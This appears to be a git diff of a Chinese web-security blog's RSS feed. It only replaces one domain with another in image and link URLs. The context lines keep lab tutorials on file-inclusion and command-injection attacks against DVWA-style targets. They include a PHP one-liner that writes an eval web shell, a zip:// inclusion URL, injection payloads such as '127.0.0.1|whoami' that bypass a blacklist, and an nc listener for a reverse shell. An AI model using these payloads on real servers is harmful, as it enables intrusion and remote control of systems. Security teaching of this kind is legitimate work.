-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-44_hu915a20ec6adb9e8d40e10623dd2a91c1_799133_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-44_hu915a20ec6adb9e8d40e10623dd2a91c1_799133_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-44_hu915a20ec6adb9e8d40e10623dd2a91c1_799133_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-44_hu915a20ec6adb9e8d40e10623dd2a91c1_799133_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -626,10 +626,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;然后再通过文件上传漏洞和&lt;code&gt;phar://&lt;/code&gt;伪协议解析&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-47.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-47.png&#34;
 	width=&#34;843&#34;
 	height=&#34;664&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-47_hub9fce7f23dfa0d8e6d00374f0c00abfc_116045_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-47_hub9fce7f23dfa0d8e6d00374f0c00abfc_116045_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-47_hub9fce7f23dfa0d8e6d00374f0c00abfc_116045_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-47_hub9fce7f23dfa0d8e6d00374f0c00abfc_116045_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -654,10 +654,10 @@
 &lt;h4 id=&#34;过程-2&#34;&gt;过程&lt;/h4&gt;
 &lt;p&gt;依旧是先上传，再利用文件包含漏洞进行解析&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://ip/path/include.php?filename=zip://info.jpg%23info.php
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08.png&#34;
 	width=&#34;830&#34;
 	height=&#34;669&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08_hub400a6e1abbecfeef0521225a41e890e_111360_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08_hub400a6e1abbecfeef0521225a41e890e_111360_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08_hub400a6e1abbecfeef0521225a41e890e_111360_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_13-08_hub400a6e1abbecfeef0521225a41e890e_111360_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -685,10 +685,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;...
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;&amp;lt;?PHP fputs(fopen(&amp;#39;shell.php&amp;#39;,&amp;#39;w&amp;#39;),&amp;#39;&amp;lt;?php @eval($_POST[cmd])?&amp;gt;&amp;#39;);?&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6.png&#34;
 	width=&#34;1187&#34;
 	height=&#34;502&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6_hu241eea23f6eb7cc1ab42898a83f80f5e_79397_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6_hu241eea23f6eb7cc1ab42898a83f80f5e_79397_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6_hu241eea23f6eb7cc1ab42898a83f80f5e_79397_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16b8c466aa20ae5a1c45ccf807a12a3da262a9b6_hu241eea23f6eb7cc1ab42898a83f80f5e_79397_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;没有红包，但有数据包&#34;
@@ -700,10 +700,10 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;然后用你的Webshell工具连接即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-07-02-image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-07-02-image.png&#34;
 	width=&#34;1079&#34;
 	height=&#34;650&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-07-02-image_hu87c53b533c1170fb28448cf72a1b54d5_77116_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-07-02-image_hu87c53b533c1170fb28448cf72a1b54d5_77116_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-07-02-image_hu87c53b533c1170fb28448cf72a1b54d5_77116_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-07-02-image_hu87c53b533c1170fb28448cf72a1b54d5_77116_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -807,10 +807,10 @@
 &lt;blockquote&gt;
 &lt;p&gt;P.S. burp的intruder里面自带一些路径&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-18-53-image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-18-53-image.png&#34;
 	width=&#34;1210&#34;
 	height=&#34;481&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-18-53-image_hu480eb74c4248d2d25f92e20a6fb5bde9_47545_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-18-53-image_hu480eb74c4248d2d25f92e20a6fb5bde9_47545_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-18-53-image_hu480eb74c4248d2d25f92e20a6fb5bde9_47545_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-18-53-image_hu480eb74c4248d2d25f92e20a6fb5bde9_47545_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -819,10 +819,10 @@
 		data-flex-basis=&#34;603px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-19-56-image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-19-56-image.png&#34;
 	width=&#34;1217&#34;
 	height=&#34;320&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-19-56-image_hu4d0f41006146f70731c811ee037804ea_30594_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-19-56-image_hu4d0f41006146f70731c811ee037804ea_30594_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-19-56-image_hu4d0f41006146f70731c811ee037804ea_30594_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11-14-19-56-image_hu4d0f41006146f70731c811ee037804ea_30594_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -870,10 +870,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后访问&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://ip:8080/path/test.jsp?payload=1.jsp
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;让1.jsp被包含&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/d7064dfe44ecc3d88e90c2f4c435acddafedf233.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/d7064dfe44ecc3d88e90c2f4c435acddafedf233.png&#34;
 	width=&#34;1128&#34;
 	height=&#34;259&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/d7064dfe44ecc3d88e90c2f4c435acddafedf233_hua30fbd3dfd22e934a64a9fe8137c9c2f_44442_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/d7064dfe44ecc3d88e90c2f4c435acddafedf233_hua30fbd3dfd22e934a64a9fe8137c9c2f_44442_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/d7064dfe44ecc3d88e90c2f4c435acddafedf233_hua30fbd3dfd22e934a64a9fe8137c9c2f_44442_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/d7064dfe44ecc3d88e90c2f4c435acddafedf233_hua30fbd3dfd22e934a64a9fe8137c9c2f_44442_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;锵锵锵，被执行了&#34;
@@ -891,11 +891,11 @@
         </item>
         <item>
         <title>Web安全:命令执行/注入(RCE)</title>
-        <link>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/</link>
+        <link>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/</link>
         <pubDate>Fri, 02 Sep 2022 21:29:09 +0800</pubDate>
         
-        <guid>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/cover.jpg" alt="Featured image of post Web安全:命令执行/注入(RCE)" /&gt;&lt;h1 id=&#34;web安全命令执行注入rce&#34;&gt;Web安全:命令执行/注入(RCE)&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/cover.jpg" alt="Featured image of post Web安全:命令执行/注入(RCE)" /&gt;&lt;h1 id=&#34;web安全命令执行注入rce&#34;&gt;Web安全:命令执行/注入(RCE)&lt;/h1&gt;
 &lt;blockquote&gt;
 &lt;p&gt;与其说是死亡之ping&amp;hellip;&lt;/p&gt;
 &lt;p&gt;还不如直接说:&lt;strong&gt;RCE之PING&lt;/strong&gt;&lt;/p&gt;
@@ -956,10 +956,10 @@
 &lt;h2 id=&#34;靶场实战&#34;&gt;靶场实战&lt;/h2&gt;
 &lt;p&gt;打开DVWA到&lt;code&gt;Vulnerability: Command Injection&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;看到这是一个Ping的界面&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-28.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-28.png&#34;
 	width=&#34;846&#34;
 	height=&#34;185&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-28_hu08b641a858649803b959b7f6b56e47eb_15807_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-28_hu08b641a858649803b959b7f6b56e47eb_15807_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-28_hu08b641a858649803b959b7f6b56e47eb_15807_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-28_hu08b641a858649803b959b7f6b56e47eb_15807_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1007,10 +1007,10 @@
 &lt;p&gt;这个版本就是属于喂啥吃啥的类型&lt;/p&gt;
 &lt;p&gt;简单写一个payload&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;whoami
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-49.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-49.png&#34;
 	width=&#34;855&#34;
 	height=&#34;391&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-49_hufe0cb1fd327a0239801ca43bcf591fec_65078_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-49_hufe0cb1fd327a0239801ca43bcf591fec_65078_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-49_hufe0cb1fd327a0239801ca43bcf591fec_65078_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-49_hufe0cb1fd327a0239801ca43bcf591fec_65078_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;可以看到后面的whoami命令被执行了&#34;
@@ -1037,10 +1037,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
 &lt;p&gt;P.S. 因为没有ip,所以Ping执行失败了，所以执行后面的&lt;code&gt;whoami&lt;/code&gt;命令&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-55.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-55.png&#34;
 	width=&#34;860&#34;
 	height=&#34;231&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-55_hu2b5714929aa105e9b56d22b855b700b4_18343_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-55_hu2b5714929aa105e9b56d22b855b700b4_18343_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-55_hu2b5714929aa105e9b56d22b855b700b4_18343_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-55_hu2b5714929aa105e9b56d22b855b700b4_18343_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;绕过黑名单成功!&#34;
@@ -1072,10 +1072,10 @@
 &lt;p&gt;程序过滤了&lt;code&gt;| &lt;/code&gt;(有空格)，而不是&lt;code&gt;|&lt;/code&gt;&amp;hellip;&lt;/p&gt;
 &lt;p&gt;所以我们完全可以用&lt;code&gt;|&lt;/code&gt;绕过去&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;whoami
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-02.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-02.png&#34;
 	width=&#34;841&#34;
 	height=&#34;212&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-02_hu479e066281f79b3f83f1f55e7ce07f0e_19306_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-02_hu479e066281f79b3f83f1f55e7ce07f0e_19306_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-02_hu479e066281f79b3f83f1f55e7ce07f0e_19306_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-02_hu479e066281f79b3f83f1f55e7ce07f0e_19306_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -1089,10 +1089,10 @@
 &lt;p&gt;我们可以弹个shell&lt;/p&gt;
 &lt;p&gt;先在攻击的机器上用nc监听一个端口(端口任意，只要不被其他东西占用)&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lvnp 端口号
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-13.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-13.png&#34;
 	width=&#34;426&#34;
 	height=&#34;147&#34;
